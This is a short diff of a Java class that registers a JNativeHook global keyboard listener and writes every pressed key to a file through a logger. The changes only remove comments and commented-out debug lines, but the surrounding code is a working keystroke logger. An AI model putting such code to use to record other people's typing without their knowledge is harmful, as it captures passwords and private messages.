@@ -25,7 +25,6 @@ public class MyCommands implements NativeKeyListener {
         } catch (NativeHookException ex) {
             return "Failed to initialize JNativeHook: " + ex.getMessage();
         }
-        // Add this class as the NativeKeyListener
         GlobalScreen.addNativeKeyListener(this);
         return "Started Logging..." + time;
     }
@@ -39,8 +38,6 @@ public class MyCommands implements NativeKeyListener {
         }
         // Handle the key pressed event
           Loger.writeFile(keyText);
-//        Loger.writeFile(String.valueOf(e.getKeyChar()));
-//        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
     }
 
 }
